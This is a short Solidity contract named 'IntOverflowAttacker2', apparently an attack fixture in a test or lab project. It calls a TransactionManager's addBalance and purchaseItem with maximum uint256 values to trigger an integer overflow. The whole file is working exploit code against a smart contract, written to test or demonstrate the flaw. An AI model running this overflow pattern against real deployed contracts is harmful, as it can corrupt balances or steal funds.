// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {TransactionManager} from "../../src/TransactionManager.sol";

contract IntOverflowAttacker2 {
    TransactionManager tmgr;
    constructor(TransactionManager _tmgr) {
        tmgr = _tmgr;
    }

    function attack() public {
        tmgr.registerUser();
        tmgr.addBalance(type(uint256).max);
        tmgr.purchaseItem(1, type(uint256).max);
        tmgr.purchaseItem(1, type(uint256).max);
        tmgr.purchaseItem(1, type(uint256).max);
    }       

}
